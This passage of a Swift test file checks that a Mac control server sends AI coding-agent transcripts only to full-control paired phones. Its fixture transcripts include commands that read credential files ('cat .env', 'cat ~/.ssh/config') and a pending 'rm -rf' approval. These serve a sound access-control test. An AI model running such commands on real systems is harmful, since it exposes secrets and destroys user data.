        #"""
        {"type":"message_end","message":{"role":"assistant","content":
        [{"type":"text","text":"Running the suite."}]}}
        """#,
        #"{"type":"agent_end"}"#,
    ]

    /// Every route this milestone adds, with a body where one is needed — so the scope test
    /// covers all of them rather than a representative sample.
    /// Every route this milestone adds, with a body where one is needed — so the scope test
    /// covers all of them rather than a representative sample.
    static let everyAgentRoute: [(String, String, String?)] = [
        ("GET", "/agent/sessions", nil),
        ("GET", "/agent/sessions/codex", nil),
        ("DELETE", "/agent/sessions/codex", nil),
        ("POST", "/agent/sessions/codex/start", "{}"),
        ("POST", "/agent/sessions/codex/new", "{}"),
        ("POST", "/agent/sessions/codex/interrupt", "{}"),
        ("POST", "/agent/sessions/codex/messages", #"{"text":"hello"}"#),
        ("POST", "/agent/sessions/codex/approvals/appr-1", #"{"decision":"accept"}"#),
    ]

    static func json(_ text: String) throws -> JSONValue {
        try JSONDecoder().decode(JSONValue.self, from: Data(text.utf8))
    }

    static func object(_ text: String) throws -> [String: Any] {
        try #require(
            JSONSerialization.jsonObject(with: Data(text.utf8)) as? [String: Any]
        )
    }

    /// One reading of an engine, reconciled and turned into frames — what the watcher does
    /// on each tick, without the clock.
    static func settle(_ model: AppModel, engine: String) -> [BuddyEvent] {
        guard let snapshot = model.agentSnapshot(engine: engine) else { return [] }
        BuddyAgentSessions.shared.reconcile(snapshot)
        return BuddyAgentSessions.shared.frames(from: snapshot)
    }

    static func events(_ frames: [BuddyEvent]) -> [ControlAPI.AgentEvent] {
        frames.compactMap {
            guard case .agent(let event) = $0 else { return nil }
            return event
        }
    }

    static func kinds(_ events: [BuddyEvent]) -> [String] {
        Self.events(events).map(\.kind)
    }

    static func states(_ events: [BuddyEvent]) -> [String] {
        Self.events(events).compactMap(\.state)
    }

    static func decodeAgent(_ frame: BuddyEvent.Frame) -> ControlAPI.AgentEvent? {
        guard frame.name == "agent" else { return nil }
        return try? JSONDecoder().decode(ControlAPI.AgentEvent.self, from: frame.data)
    }
}

/// A phone on a link that can stall: whatever the reader sends arrives, and while stalled
/// the reader is held inside the send — so the hub's buffer behind it fills and drops, the
/// way a real slow socket makes it.
actor SlowLink {
    private(set) var frames: [BuddyEvent.Frame] = []
    private var stalled = false
    private var held: CheckedContinuation<Void, Never>?

    func stall() { stalled = true }

    func release() {
        stalled = false
        held?.resume()
        held = nil
    }

    func deliver(_ frame: BuddyEvent.Frame) async {
        frames.append(frame)
        guard stalled else { return }
        await withCheckedContinuation { held = $0 }
    }

    func waitFor(count: Int, within limit: Duration = .seconds(20)) async throws -> Bool {
        let deadline = ContinuousClock.now + limit
        while frames.count < count {
            guard ContinuousClock.now < deadline else { return false }
            try await Task.sleep(for: .milliseconds(5))
        }
        return true
    }
}

/// The `agent` frames one hub subscription has received, collected off the test's task.
final class AgentFrames: @unchecked Sendable {
    private let lock = NSLock()
    private var received: [ControlAPI.AgentEvent] = []

    func append(_ event: ControlAPI.AgentEvent) {
        lock.lock()
        received.append(event)
        lock.unlock()
    }

    var events: [ControlAPI.AgentEvent] {
        lock.lock()
        defer { lock.unlock() }
        return received
    }

    func waitFor(
        within limit: Duration = .seconds(20),
        _ condition: @Sendable ([ControlAPI.AgentEvent]) -> Bool
    ) async throws -> Bool {
        let deadline = ContinuousClock.now + limit
        while !condition(events) {
            guard ContinuousClock.now < deadline else { return false }
            try await Task.sleep(for: .milliseconds(10))
        }
        return true
    }
}

/// Every `Settings` a test's code tried to write down, instead of writing it.
final class SaveRecorder: @unchecked Sendable {
    private let lock = NSLock()
    private var saved: [Settings] = []

    var record: @Sendable (Settings) -> Void {
        { [self] settings in
            lock.lock()
            saved.append(settings)
            lock.unlock()
        }
    }

    var count: Int {
        lock.lock()
        defer { lock.unlock() }
        return saved.count
    }

    var lastCodexModel: String? {
        lock.lock()
        defer { lock.unlock() }
        return saved.last?.codexModel
    }
}

/// Binds the agent sessions' seams for every test in a suite: the guardrail reported off
/// rather than read from this Mac's own Jev settings, and any save handed to nobody rather
/// than written — `Settings.save()` also writes the login Keychain, which no test may touch.
/// A test that wants a different answer binds its own inside this one.
struct HermeticAgentSeams: SuiteTrait, TestTrait, TestScoping {
    var isRecursive: Bool { true }

    func provideScope(
        for test: Test, testCase: Test.Case?,
        performing function: @Sendable () async throws -> Void
    ) async throws {
        try await AgentSessionSeams.$guardrails.withValue(.off) {
            try await AgentSessionSeams.$saveSettings.withValue({ _ in }) {
                try await function()
            }
        }
    }
}

extension Trait where Self == HermeticAgentSeams {
    static var hermeticAgentSeams: Self { Self() }
}

/// The tests that open a real `/events` stream against a real `AppModel`, and so the ones
/// that have to share a suite with the other live one.
///
/// `BuddyEventPump` and `AgentEventPump` are process-wide singletons — `AppModel` is
/// `@Observable`, so an extension cannot hold their task — and a singleton watches one hub.
/// Two suites each opening a stream against their own hub would take the pumps off each
/// other, and whichever lost would wait for frames that were being posted somewhere else.
/// `BuddyLiveEventTests` is `.serialized` for exactly that reason, so these join it rather
/// than racing it.
///
/// What the server reads on its own tasks — whether the guardrail is on — is not under a
/// test's task-local seams, so here it is this Mac's own Jev setting, read and never
/// written. Nothing asserted below depends on it.
extension BuddyLiveEventTests {

    /// The whole chain once: a real `AppModel` as the host, a real control server, a real
    /// socket, and a phone's token — so the agent routes are proved to dispatch to the app
    /// rather than to the protocol's "this host runs no agents" default.
    @Test func aPhoneSeesTheMacsOwnSessionsOverTheWire() async throws {
        AgentEventPump.shared.stop()
        BuddyEventPump.shared.stop()
        defer {
            AgentEventPump.shared.stop()
            BuddyEventPump.shared.stop()
        }

        let model = BuddyAgentSessionTests.freshModel()
        BuddyAgentSessionTests.run(codex: model)
        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant("Ready."))]

        try await withServer(host: model) { fixture in
            let phone = try await fixture.pair()
            let (status, body) = try await fixture.phone.call(
                "GET", "/agent/sessions", token: phone.token
            )
            #expect(status == 200)
            let list = try JSONDecoder().decode(ControlAPI.AgentSessionList.self, from: body)
            #expect(list.sessions.map(\.engine) == ControlAPI.agentEngines)
            let codex = try #require(list.sessions.first { $0.engine == "codex" })
            #expect(codex.state == "running")
            #expect(codex.itemCount == 1)

            let (detailStatus, detailBody) = try await fixture.phone.call(
                "GET", "/agent/sessions/codex", token: phone.token
            )
            #expect(detailStatus == 200)
            let detail = try JSONDecoder().decode(
                ControlAPI.AgentSessionDetail.self, from: detailBody
            )
            #expect(detail.items.map(\.text) == ["Ready."])

            // And the frames reach a subscriber, which is the wiring `beginEventUpdates`
            // is responsible for: a change made while the stream is open, not a snapshot
            // taken at connect.
            let received = Recorder()
            let reader = Task {
                try await fixture.phone.events(
                    "GET", "/events", token: phone.token, body: nil
                ) { frames in
                    received.set(frames)
                    return frames.contains { $0.name == "agent" && $0.data.contains("a2") }
                }
            }
            defer { reader.cancel() }

            // The opening first: state and turn for both engines. It is the watcher's
            // baseline reading, so a change made before it would be in the transcript a
            // phone fetches rather than in a frame — which is the rule a phone follows, and
            // so the rule this test follows.
            #expect(try await received.waitFor { $0.filter { $0.name == "agent" }.count >= 4 })
            model.codexItems.append(
                CodexChatItem(id: "a2", kind: .assistant("Working on it."))
            )
            #expect(try await received.waitFor {
                $0.contains { $0.name == "agent" && $0.data.contains("a2") }
            })
            let agent = try #require(
                received.frames.last { $0.name == "agent" && $0.data.contains("a2") }
            )
            let event = try JSONDecoder().decode(
                ControlAPI.AgentEvent.self, from: Data(agent.data.utf8)
            )
            #expect(event.engine == "codex")
            #expect(event.kind == "item")
            #expect(event.item?.text == "Working on it.")
            #expect(event.epoch == detail.epoch)
        }
    }

    /// B1, over the wire and mutation-proof: a full-control phone, a chat-only phone and
    /// the swarm all hold `/events` at once, the transcript changes, and only the first is
    /// sent it. The other two still receive what they always did.
    ///
    /// The full-control stream is what makes this meaningful. With no audience for agent
    /// frames the watcher would not run at all, and "no agent frames arrived" would be true
    /// whatever the filter did; with one, the frames exist, and the filter is the only
    /// thing keeping them from the other two.
    @Test func aChatOnlyPhoneAndTheSwarmAreNeverSentATranscript() async throws {
        AgentEventPump.shared.stop()
        BuddyEventPump.shared.stop()
        defer {
            AgentEventPump.shared.stop()
            BuddyEventPump.shared.stop()
        }

        let model = BuddyAgentSessionTests.freshModel()
        BuddyAgentSessionTests.run(codex: model)
        model.codexItems = [CodexChatItem(
            id: "c1",
            kind: .command(command: "cat .env", output: "API_KEY=placeholder", running: false)
        )]

        try await withServer(host: model, swarmToken: BuddyAgentSessionTests.swarmSecret) {
            fixture in
            let full = try await fixture.pair(name: "Studio phone")
            let chat = try await fixture.pair(name: "Lent out", scope: .chat)

            // Sanity: the routes themselves are closed to both.
            #expect(try await fixture.phone.status(
                "GET", "/agent/sessions/codex", token: chat.token
            ) == 403)
            #expect(try await fixture.local.status(
                "GET", "/agent/sessions/codex", token: BuddyAgentSessionTests.swarmSecret
            ) == 403)

            let watching = Recorder()
            let lentOut = Recorder()
            let node = Recorder()
            let readers = [
                Task { try await fixture.phone.events(
                    "GET", "/events", token: full.token, body: nil
                ) { frames in watching.set(frames); return false } },
                Task { try await fixture.phone.events(
                    "GET", "/events", token: chat.token, body: nil
                ) { frames in lentOut.set(frames); return false } },
                Task { try await fixture.local.events(
                    "GET", "/events", token: BuddyAgentSessionTests.swarmSecret, body: nil
                ) { frames in node.set(frames); return false } },
            ]
            defer { readers.forEach { $0.cancel() } }

            // Every stream has started before anything changes — and the full-control one
            // has had its opening, which is the watcher's baseline: a change made before it
            // would be in the transcript that phone fetches, not in a frame.
            #expect(try await watching.waitFor { $0.filter { $0.name == "agent" }.count >= 4 })
            #expect(try await lentOut.waitFor { !$0.isEmpty })
            #expect(try await node.waitFor { !$0.isEmpty })

            model.codexItems.append(CodexChatItem(
                id: "c2",
                kind: .command(command: "cat ~/.ssh/config", output: "Host placeholder",
                               running: false)
            ))
            model.codexApprovals = [CodexApproval(
                rpcID: .number(4), kind: .command("rm -rf ~/placeholder"),
                screening: BuddyAgentSessionTests.unscreened
            )]

            // The full-control phone is sent both.
            #expect(try await watching.waitFor { frames in
                let agent = frames.filter { $0.name == "agent" }.map(\.data)
                return agent.contains { $0.contains("Host placeholder") }
                    && agent.contains { $0.contains("rm -rf") }
            })
            // Give the other two every chance to receive the same.
            try await Task.sleep(for: .milliseconds(500))

            #expect(lentOut.agentData.isEmpty, "chat-only device got: \(lentOut.agentData)")
            #expect(node.agentData.isEmpty, "swarm got: \(node.agentData)")
            // Not a dead stream: both are still sent what they always were.
            #expect(lentOut.frames.contains { $0.name == "status" || $0.name == "heartbeat" })
            #expect(node.frames.contains { $0.name == "status" || $0.name == "heartbeat" })
        }
    }

    /// A phone that drops off the network without closing its stream stops counting for
    /// the badge once the server notices the socket is gone.
    @Test func theBadgeLetsGoOfAPhoneThatHungUp() async throws {
        AgentEventPump.shared.stop()
        BuddyEventPump.shared.stop()
        defer {
            AgentEventPump.shared.stop()
            BuddyEventPump.shared.stop()
        }
        let model = BuddyAgentSessionTests.freshModel()
        let hub = BuddyEventHub()
        try await withServer(host: model, hub: hub) { fixture in
            let full = try await fixture.pair()
            let stream = try await fixture.phone.openEventStream(token: full.token)
            let appeared = ContinuousClock.now + .seconds(5)
            while await hub.agentWatcherCount() == 0, ContinuousClock.now < appeared {
                try await Task.sleep(for: .milliseconds(20))
            }
            #expect(await hub.agentWatcherCount() == 1)

            stream.cancel()   // abrupt: the client task goes, the socket with it
            let gone = ContinuousClock.now + .seconds(10)
            while await hub.agentWatcherCount() > 0, ContinuousClock.now < gone {
                try await Task.sleep(for: .milliseconds(20))
            }
            #expect(await hub.agentWatcherCount() == 0)
        }
    }
}

/// The frames one stream has received so far. Updated from inside the SSE reader's
/// callback, read from the test's loop.
final class Recorder: @unchecked Sendable {
    private let lock = NSLock()
    private var received: [TestClient.Frame] = []

    func set(_ frames: [TestClient.Frame]) {
        lock.lock()
        received = frames
        lock.unlock()
    }

    var frames: [TestClient.Frame] {
        lock.lock()
        defer { lock.unlock() }
        return received
    }

    var agentData: [String] { frames.filter { $0.name == "agent" }.map(\.data) }

    /// Waits, up to a deadline, for what this stream has received to satisfy `condition`.
    /// A deadline because an SSE stream never ends by itself: a test that waited on it
    /// without one would hang rather than fail.
    func waitFor(
        within limit: Duration = .seconds(20),
        _ condition: @Sendable ([TestClient.Frame]) -> Bool
    ) async throws -> Bool {
        let deadline = ContinuousClock.now + limit
        while !condition(frames) {
            guard ContinuousClock.now < deadline else { return false }
            try await Task.sleep(for: .milliseconds(20))
        }
        return true
    }
}

/// One HTTP exchange written by hand — for the two things `URLSession` will not send: a
/// `Host` header of the test's choosing, and a look at the status line itself. On
/// `URLSession`'s own stream task rather than a bare socket, so it rides the same
/// networking every other request in these tests does. The server closes after one
/// response, which is how the read knows it has all of it.
func rawHTTP(port: Int, session: URLSession, _ request: String) async throws -> String {
    let task = session.streamTask(withHostName: "127.0.0.1", port: port)
    task.resume()
    defer { task.cancel() }
    try await task.write(Data(request.utf8), timeout: 20)
    var received = Data()
    while true {
        let (data, atEOF) = try await task.readData(ofMinLength: 1, maxLength: 65_536, timeout: 20)
        if let data { received.append(data) }
        if atEOF || data == nil { break }
    }
    return String(decoding: received, as: UTF8.self)
}

// MARK: - The fixture

// At file scope rather than inside the suite: the live half of these tests lives in
// `BuddyLiveEventTests` (see the extension above) and needs the same loopback server, the
// same private handshake file and the same standing-in-for-a-tailnet second listener.

struct AgentFixture {
    let server: ControlServer
    let local: TestClient
    let phone: TestClient
    let registry: BuddyRegistry

    func pair(
        name: String = "Galaxy S24 Ultra", scope: BuddyScope = .full
    ) async throws -> ControlAPI.BuddyPairResponse {
        let invitation = await registry.invite(
            host: "127.0.0.1", port: phone.port, scope: scope
        )
        let (status, body) = try await phone.call(
            "POST", "/buddy/pair", token: nil,
            body: #"{"code":"\#(invitation.code)","deviceName":"\#(name)","platform":"android"}"#
        )
        #expect(status == 200)
        return try JSONDecoder().decode(ControlAPI.BuddyPairResponse.self, from: body)
    }
}

/// The recording double. `BuddyTestHost` already answers everything else a control
/// server can be asked, so the agent half is bolted onto it rather than a thirty-method
/// conformance being written out again.
@MainActor
func withAgentServer(
    swarmToken: String? = nil, _ body: (AgentFixture) async throws -> Void
) async throws {
    try await withServer(
        host: BuddyTestHost(tokens: ["ok"], pace: .milliseconds(1), failing: false),
        swarmToken: swarmToken, body
    )
}

@MainActor
func withServer(
    host: any ControlHost, swarmToken: String? = nil, hub: BuddyEventHub = BuddyEventHub(),
    _ body: (AgentFixture) async throws -> Void
) async throws {
    let directory = FileManager.default.temporaryDirectory
        .appendingPathComponent("buddy-agents-\(UUID())")
    defer { try? FileManager.default.removeItem(at: directory) }
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)

    let handshakeURL = directory.appendingPathComponent("control.json")
    let registry = BuddyRegistry(url: directory.appendingPathComponent("buddy.json"))
    let server = ControlServer(
        host: host, handshakeURL: handshakeURL, buddy: registry, events: hub,
        // The server's own stores too: its media table and the upload and poster folders
        // it sweeps, never the owner's.
        media: MediaRegistry(url: nil),
        uploadsRoot: directory.appendingPathComponent("uploads"),
        postersRoot: directory.appendingPathComponent("posters"),
        // Never the real CLI: a test must not bind whatever tailnet this machine is on.
        discoverTailnetAddress: { nil }
    )

    let configuration = URLSessionConfiguration.ephemeral
    configuration.httpMaximumConnectionsPerHost = 64
    configuration.timeoutIntervalForRequest = 20
    let session = URLSession(configuration: configuration)
    defer { session.invalidateAndCancel() }

    try await server.start(swarmToken: swarmToken)
    defer { Task { await server.stop() } }
    let deadline = ContinuousClock.now + .seconds(5)
    while !FileManager.default.fileExists(atPath: handshakeURL.path) {
        guard ContinuousClock.now < deadline else { throw BuddyTestError.timeout }
        try await Task.sleep(for: .milliseconds(20))
    }
    let handshake = try JSONDecoder().decode(
        ControlAPI.Handshake.self, from: try Data(contentsOf: handshakeURL)
    )
    await registry.setAllowsTailnetDevices(true)
    let tailnetPort = try await BuddyControlTests.bindTailnetListener(
        on: server, avoiding: handshake.port
    )

    try await body(AgentFixture(
        server: server,
        local: TestClient(port: handshake.port, token: handshake.token, session: session),
        phone: TestClient(port: tailnetPort, token: handshake.token, session: session),
        registry: registry
    ))
    await server.stop()
}

// MARK: - The double's agent half

/// What the fake host was asked, in order. An actor of its own because `BuddyTestHost` is
/// one and an extension cannot give it a stored property.
actor AgentCallLog {
    static let shared = AgentCallLog()

    /// The row a send is answered with, so the route test can check the body rather than
    /// only the status.
    static let acceptedItemID = "item_accepted_1"

    private(set) var calls: [String] = []

    func note(_ call: String) { calls.append(call) }
    func clear() { calls.removeAll() }
}

/// The agent half of the control-server double.
///
/// Bolted onto `BuddyTestHost` rather than written as a second thirty-method conformance:
/// it already answers everything else a control server can be asked, and the witness the
/// compiler picks for a conformance in this module is the concrete method here rather than
/// the protocol's "this host runs no agents" default.
extension BuddyTestHost {

    private func summary(_ engine: String) -> ControlAPI.AgentSessionSummary {
        ControlAPI.AgentSessionSummary(
            engine: engine, state: "running", epoch: "fixture-epoch", model: "local/qwen3",
            modelChoices: [.init(id: "local/qwen3", label: "Qwen3", where: "This Mac")],
            cwd: "~/fixture", approvals: "asked", sandbox: "read-only",
            updatedAt: "2026-09-19T10:00:00Z"
        )
    }

    public func agentSessions() async -> ControlAPI.AgentSessionList {
        await AgentCallLog.shared.note("sessions")
        return ControlAPI.AgentSessionList(
            sessions: ControlAPI.agentEngines.map { summary($0) }
        )
    }

    public func agentSession(
        engine: String, query: ControlAPI.AgentSessionQuery
    ) async throws -> ControlAPI.AgentSessionDetail {
        guard ControlAPI.agentEngines.contains(engine) else {
            throw AgentSessionError.unknownEngine(engine)
        }
        await AgentCallLog.shared.note(
            "session \(engine) since=\(query.since.map(String.init) ?? "-") "
            + "epoch=\(query.epoch ?? "-") limit=\(query.limit.map(String.init) ?? "-")"
        )
        return ControlAPI.AgentSessionDetail(
            session: summary(engine), items: [], approvals: [], seq: 12,
            epoch: "fixture-epoch"
        )
    }

    public func startAgentSession(
        engine: String
    ) async throws -> ControlAPI.AgentSessionSummary {
        await AgentCallLog.shared.note("start \(engine)")
        return summary(engine)
    }

    public func newAgentThread(engine: String) async throws -> ControlAPI.AgentSessionSummary {
        await AgentCallLog.shared.note("new \(engine)")
        return summary(engine)
    }

    public func stopAgentSession(engine: String) async throws -> ControlAPI.AgentSessionSummary {
        await AgentCallLog.shared.note("stop \(engine)")
        return summary(engine)
    }

    public func sendAgentMessage(
        engine: String, _ request: ControlAPI.AgentMessageRequest
    ) async throws -> ControlAPI.AgentMessageAccepted {
        await AgentCallLog.shared.note(
            "send \(engine) text=\(request.text) model=\(request.model ?? "-")"
        )
        return ControlAPI.AgentMessageAccepted(itemID: AgentCallLog.acceptedItemID)
    }

    public func interruptAgentSession(
        engine: String
    ) async throws -> ControlAPI.AgentSessionSummary {
        await AgentCallLog.shared.note("interrupt \(engine)")
        return summary(engine)
    }

    public func answerAgentApproval(
        engine: String, id: String, decision: String
    ) async throws -> ControlAPI.AgentApprovalResult {
        await AgentCallLog.shared.note("answer \(engine) \(id) \(decision)")
        return ControlAPI.AgentApprovalResult(
            id: id, decision: decision == "accept" ? "accepted" : "declined",
            session: summary(engine)
        )
    }
}
